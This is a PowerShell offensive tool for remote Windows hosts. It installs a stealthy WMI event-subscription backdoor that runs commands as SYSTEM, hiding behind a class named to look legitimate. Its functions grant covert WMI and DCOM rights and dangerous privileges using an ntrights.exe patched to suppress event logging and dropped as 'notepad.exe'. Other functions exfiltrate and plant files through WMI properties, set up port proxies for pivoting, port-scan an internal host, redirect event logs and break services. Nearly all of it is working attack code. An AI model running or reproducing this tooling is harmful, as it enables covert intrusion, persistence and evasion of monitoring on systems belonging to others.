#a few lines of documentation about what the functions do and such:
# so you have a user with admin privileges on some place+wmi access to that place.
# 
# installing the shell:
# startup   - creates the new wmi class.
# backdoor  - puts an event monitor on creation of new instances of that class, with a vbs script that runs whenever it happens.
#             the script runs whatever is in the "Provider" property of the new instance and writes output in base64 to 
#             the "result" property. if the user that creates the backdoor doesn't have admin privileges any longer the event 
#             consumer won't run properly.
# giveprivs - give wmi privileges to a user/group. included privileges are: wmi full control permissions on root,root\subscription,
#             root\cimv2. dcom permissions(via changing the hklm\software\microsoft\ole\machinelaunchrestriction key which contains
#             the dcom launch permissions sddl) necessary for wmi access. user access rights required for running things via wmi - 
#             SeBackupPrivilege, SeRestorePrivilege, as well as some other user access rights just because:D this is done through
#             Microsoft's ntrights.exe. ntrights.exe is patched with many nops to not generate event log thingies(changed the call 
#             to ReportEventW and all the pushes before it to nop).
# 
# after these 3 you should be able to use backdoorcmd and backdoorget to run stuff/retrieve output as local system.
# backdoor commands time out after 60 seconds(change if needed but it seems like a good idea).
# 
# unbackdoor - remove the event binding/monitoring backdoor
# clr        - delete all instances of the class(created when you run backdoor commands)
# cleanup    - deletes the class(but not the backdoor)
# run        - run stuff. this runs the command with powershell, doesn't actually return a powershell object, because in powershell 2.0
#              object deserialization is using files.. this returns a -join '`n' on your output so if you want readable output make sure
#              stdout looks the part. this uses your current user.
# get        - gets output of commands run with "run"
# up         - upload file from the remote host to the wmi repo(saved as property of the class)
# down       - download(to local computer) a file that was uploaded with up.
# send       - sends a file from local computer to remote one.
# proxy      - sets up a proxy using admin backdoor
# unproxy    - yes.
#
#
# run,up,send will not work if existing instances of the class exist(these are created when running backdoor commands), so use clr
# before you run them to delete instances.
# annoyingthings - 
# 1. doesn't look like SeBackup and SeRestore privileges actually work too well here, you won't have write/read access to many places that
# you should(even public folders). solution - either take ownership and give yourself permissions on folders or just create new folders
# and use them. 
# 2. when you upload really big things to wmi it starts working realllllly slowly(a 100mb dump file uploaded as a class property made
# things run veeeeeery slow).

$tar = 'MY_SERVER'
$base = 'root'
$namespace = '\\'+$tar+'\'+$base
$clsname = 'QualifierProviderRegistration' #'SeemsLegit'
$inputname= 'Provider' #'YeahNoProblemHere' #backdoor input/output property names
$outputname= 'QualifierTypeList'#'QuiteAlright'
$test=$null
function startup(){
gwmi -Class $clsname -ComputerName $tar -Namespace $base -ea silentlycontinue -ev test
if ($test){
$newclass = New-Object Management.ManagementClass($namespace,$null,$null)
$newclass.Name = $clsname
$newclass.Properties.add($inputname,'Cool') #DefaultProvider
$newclass.Properties.add($outputname,'T3mpl8t!') #Template
$newclass.properties[$inputname].qualifiers.add('key',$true)
$newclass.Put()
}
else{
"there is already a class named $clsname"
}
}
#[System.Management.Automation.PSSerializer]::Serialize instead of -join "`n" but doesnt work without powershell 3.0, and powershell 2 serialization needs to write files to disk??...
function run([string]$cmd,[string]$property='QuerySupportLevels'){

#doesnt actually work when class has instances(which is done for the sneaky backdoor), use clr to delete all instances.
$remotecmd = [convert]::tobase64string([text.encoding]::unicode.getbytes(
@('$cls = New-Object Management.ManagementClass("'+$namespace+'","'+$clsname+'",$null)';
'$res = ((iex "'+$cmd+'") -join "`n") + ($error -join "`n")';
'$cls.Properties.Add("'+$property+'",$res)';
'$cls.Put()') -join ';')
)
Invoke-WmiMethod -Class Win32_Process -ComputerName $tar -Name Create -ArgumentList ("powershell -noprofile -windowstyle hidden -encodedcommand "+$remotecmd)
}

function get([string]$property='QuerySupportLevels'){
$res = (New-Object Management.ManagementClass($namespace,$clsname,$null)).properties[$property].value
if ($res){$res}#[Management.Automation.PSSerializer]::Deserialize($res)}
else{'no output(yet?)'}
}

function up([string]$srcpath,[string]$wmipath='Provider'){
run -cmd ("[convert]::tobase64string([io.file]::readallbytes('"+$srcpath+"'))") -property $wmipath
}

function down([string]$dstpath,[string]$wmipath='Provider'){
$file = get $wmipath
[io.file]::WriteAllBytes($dstpath,[convert]::FromBase64String($file))
}

function send($srcpath,$targetpath){
$property = 'Provider'
$filecontent = [convert]::tobase64string([io.file]::readallbytes($srcpath))
$cls = (New-Object Management.ManagementClass($namespace,$clsname,$null))
$cls.Properties.Add($property,$filecontent)
$cls.Put()
$readfile = "```$kewl=(New-Object Management.ManagementClass('"+$namespace+"','"+$clsname+"',```$null)).properties['"+$property+"'].value"
run -cmd ($readfile+";[io.file]::WriteAllBytes('$targetpath',[convert]::FromBase64String(```$kewl));111")
}

function backdoor(){
$timeout = 60 ##oops?? remember to change this ##remember to make this function-ish, 0=never time out #also remember to change vbscript string to have $clsname where needed instead of hardcoded(or not???)
#$oldvbscript = 'Function Base64Encode(inData): Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/": Dim cOut, sOut, I: For I=1 To Len(inData) Step 3:  Dim nGroup, pOut, sGroup:  nGroup = &H10000 * Asc(Mid(inData, I, 1)) + &H100 * MyASC(Mid(inData, I+1, 1)) + MyASC(Mid(inData, I + 2, 1)):  nGroup = Oct(nGroup):  nGroup = String(8-Len(nGroup), "0") & nGroup:  pOut = Mid(Base64, CLng("&o" & Mid(nGroup, 1, 2)) + 1, 1) + Mid(Base64, CLng("&o" & Mid(nGroup, 3, 2)) + 1, 1) + Mid(Base64, CLng("&o" & Mid(nGroup, 5, 2)) + 1, 1) + Mid(Base64, CLng("&o" & Mid(nGroup, 7, 2)) + 1, 1):  sOut = sOut + pOut: Next: Base64Encode = sOut:End Function:Function MyASC(OneChar): If OneChar = "" Then MyASC = 0: Else MyASC = Asc(OneChar): End If:End Function:Set wmi = GetObject("winmgmts:" &"{impersonationlevel=impersonate}!\\.\root"):Set wshell = CreateObject("WScript.Shell"):Set c = wmi.ExecQuery("select * from QualifierProviderRegistration"):For Each i in c: cmd = i.Properties_("Provider").Value: Set res = wshell.Exec(cmd): test = res.StdOut.ReadAll: Set bd = i.Properties_("QualifierTypeList"): bd.value = Base64Encode(test): i.Put_:Next'
$vbscript = 'set wbem = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\subscription"):set con = wbem.get("ActiveScriptEventConsumer"):set conobj = con.spawninstance_():conobj.name="TemporaryEventConsumer":conobj.scripttext="Function Base64Encode(inData): Const Base64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"": Dim cOut, sOut, I: For I=1 To Len(inData) Step 3:  Dim nGroup, pOut, sGroup:  nGroup = &H10000 * Asc(Mid(inData, I, 1)) + &H100 * MyASC(Mid(inData, I+1, 1)) + MyASC(Mid(inData, I + 2, 1)):  nGroup = Oct(nGroup):  nGroup = String(8-Len(nGroup), ""0"") & nGroup:  pOut = Mid(Base64, CLng(""&o"" & Mid(nGroup, 1, 2)) + 1, 1) + Mid(Base64, CLng(""&o"" & Mid(nGroup, 3, 2)) + 1, 1) + Mid(Base64, CLng(""&o"" & Mid(nGroup, 5, 2)) + 1, 1) + Mid(Base64, CLng(""&o"" & Mid(nGroup, 7, 2)) + 1, 1):  sOut = sOut + pOut: Next: Base64Encode = sOut:End Function:Function MyASC(OneChar): If OneChar = """" Then MyASC = 0: Else MyASC = Asc(OneChar): End If:End Function:Set wmi = GetObject(""winmgmts:"" &""{impersonationlevel=impersonate}!\\.\root""):Set wshell = CreateObject(""WScript.Shell""):Set c = wmi.ExecQuery(""select * from '+$clsname+'""):For Each i in c: cmd = i.Properties_(""'+$inputname+'"").Value: Set res = wshell.Exec(cmd): test = res.StdOut.ReadAll: Set bd = i.Properties_(""'+$outputname+'""): bd.value = Base64Encode(test): i.Put_:Next":conobj.scriptingengine="vbscript":conobj.killtimeout=60:conobj.put_:set fil = wbem.get("__eventfilter"):set filobj = fil.spawninstance_():filobj.name = "TemporaryEventFilter":filobj.eventnamespace = "root":filobj.querylanguage = "wql":filobj.query = "select * from __instancecreationevent within 5 where targetinstance isa '+"'$clsname'"+'":filobj.put_:set bind = wbem.get("__filtertoconsumerbinding"):set bindobj = bind.spawninstance_():filobj.refresh_:conobj.refresh_:bindobj.filter=filobj.path_:bindobj.consumer=conobj.path_:bindobj.put_'
$query = "select * from __instancecreationevent within 5 where targetinstance isa '$clsname'" 
$filter = Set-WmiInstance -computername $tar -Class __eventfilter -namespace 'root\subscription' -Arguments @{name='EventFilter';eventnamespace=$base;querylanguage='WQL';query=$query}
#$consumer = Set-WmiInstance -Class logfileeventconsumer -Namespace 'root\subscription' -Arguments @{name='log';filename='C:\users\public\documents\log.log';text='%targetinstance.Provider%'}
#$consumer = Set-WmiInstance -computername $tar -Class commandlineeventconsumer -Namespace 'root\subscription' -Arguments @{name='coolconsumer';executablepath='C:\windows\system32\cmd.exe';commandlinetemplate='C:\windows\system32\cmd /c "%targetinstance.Provider%"';killtimeout=$timeout} 
$consumer = Set-WmiInstance -Class activescripteventconsumer -computername $tar -Namespace 'root\subscription' -Arguments @{name='EventConsumer';scriptingengine='VBScript';scripttext=$vbscript;killtimeout=$timeout}
$bind = Set-WmiInstance -computername $tar -Class __filtertoconsumerbinding -Namespace 'root\subscription' -Arguments @{filter=$filter;consumer=$consumer}
Start-Sleep 1
backdoorcmd '1'
Start-Sleep 5
@($bind;$filter;$consumer) |%{$_;$_ | Remove-WmiObject}
clr


}

function giveprivs($user){

#remember that these wmi/dcom privileges can be overwritten if sddl is actually changed in a "normal" way...
#also, this function writes a file to disk(ntrights)

#dcom 
$sid = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).tostring()
$conv = New-Object System.Management.ManagementClass win32_securitydescriptorhelper 
$dcomsddl = "(A;;CCDCRP;;;$sid)"
$registry = [wmiclass]"\\$tar\root\default:stdregprov"
$currentdcom = $registry.GetBinaryValue(2147483650,"software\microsoft\ole","MachineLaunchRestriction").uvalue
$newdcom = $conv.BinarySDToSDDL($currentdcom)
$newdcom.SDDL += $dcomsddl
$newbin = $conv.SDDLToBinarySD($newdcom.SDDL)
$res = $registry.SetBinaryValue(2147483650,"software\microsoft\ole","MachineLaunchRestriction",$newbin.BinarySD)
$res.returnvalue

#wmi
@('root','root\cimv2','root\subscription') | %{
$sec = gwmi -ComputerName $tar __systemsecurity -Namespace $_ 
$sddl = "(A;;CCDCLCSWRPWPRCWD;;;$sid)"
$currentsd = @($null)
$sec.psbase.invokemethod("GetSD",$currentsd)
$sd = $conv.BinarySDToSDDL($currentsd[0])
$sd.SDDL += $sddl
$newsd = @(,$conv.SDDLToBinarySD($sd.SDDL).BinarySD)
$sec.psbase.invokemethod("SetSD",$newsd)
}

$ntrightspath = 'C:\users\lol\desktop\ntrightspatched.exe' 
$remotepath = 'C:\users\public\documents\notepad.exe'
send $ntrightspath $remotepath
Start-Sleep 5 #letting ntrights be copied
$cmd = @('`$privs = @(`"SeTcbPrivilege`",`"SeDebugPrivilege`",`"SeBackupPrivilege`",`"SeRestorePrivilege`",`"SeTakeOwnershipPrivilege`",`"SeLoadDriverPrivilege`",`"SeCreateTokenPrivilege`")';
'`$privs | %{'+$remotepath+' -u '+$user+' +r `$_}';
'remove-item `"'+$remotepath+'`" -Force') -join ';'

run $cmd

}

function cleanup(){
#doesn't remove backdoors, just the class itself
(New-Object Management.ManagementClass($namespace,$clsname,$null)).Delete()
}

function backdoorcmd($cmd){

$a = (New-Object Management.ManagementClass($namespace,$clsname,$null))
$b = $a.CreateInstance()
$b.$inputname = $cmd 
$b.put()


}

function backdoorget($cmd){
[text.encoding]::utf8.getstring([convert]::frombase64string((gwmi -computername $tar -Class $clsname -Namespace $base | ?{$_.$inputname -eq $cmd}).$outputname)) #Provider, QualifierTypeList
}

function clr(){
gwmi -ComputerName $tar -Class $clsname -Namespace $base | Remove-WmiObject
}


function unbackdoor(){
gwmi -Namespace root\subscription __eventfilter -ComputerName $tar | ?{$_.name -match 'TemporaryEventFilter'} | Remove-WmiObject
#gwmi -Namespace root\subscription commandlineeventconsumer  -ComputerName $tar| Remove-WmiObject
gwmi -Namespace root\subscription activescripteventconsumer -computername $tar | ?{$_.name -match 'TemporaryEventConsumer'} | Remove-WmiObject
gwmi -Namespace root\subscription __filtertoconsumerbinding  -ComputerName $tar | ?{$_.filter -match 'TemporaryEventFilter'} | Remove-WmiObject
}

function test($ns='root'){
gwmi -Namespace $ns -Class __namespace | %{$new = ($ns+"\"+$_.name); $new;test $new}
}

#netsh interface portproxy add v4tov4 listenport=1234 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.0.5
#netsh interface portproxy delete v4tov4 listenport=1234 listenaddress=127.0.0.1
#netsh interface portproxy show v4tov4

#portscan string
$portscan = '`$a = (1..4443)+(4445..15000);`$a | %{`$cool=New-Object system.net.sockets.tcpclient;`$lel=`$cool.BeginConnect(`"192.168.0.5`",`$_,`$null,`$null);Start-Sleep -Milliseconds 10;if(`$cool.connected){`$_}};`"done`"'

function proxy($localaddress,$localport,$dstaddress,$dstport){
clr
backdoorcmd "netsh interface portproxy add v4tov4 listenport=$localport listenaddress=$localaddress connectport=$dstport connectaddress=$dstaddress"
Start-Sleep 4
clr
run 'netsh interface portproxy show v4tov4'
Start-Sleep 5
get
}

function unproxy($localaddress,$localport){
clr
backdoorcmd "netsh interface portproxy delete v4tov4 listenport=$localport listenaddress=$localaddress"
Start-Sleep 4
clr

}


function revdns($hosts){
$hosts | %{[net.dns]::GetHostByAddress($_).hostname}
}


function set-eventlogfile([string]$logname,[string]$logpath){
sp "hklm:\SYSTEM\CurrentControlSet\services\eventlog\$logname" 'File' $logpath
sp "hklm:\SYSTEM\CurrentControlSet\services\eventlog\$logname" 'Flags' 1
}

function mess-service([string]$name){
sp "hklm:\SYSTEM\CurrentControlSet\services\$name" 'RequiredPrivileges' ((gp "hklm:\SYSTEM\CurrentControlSet\services\$name").requiredprivileges + @('SeNopePrivilege'))
}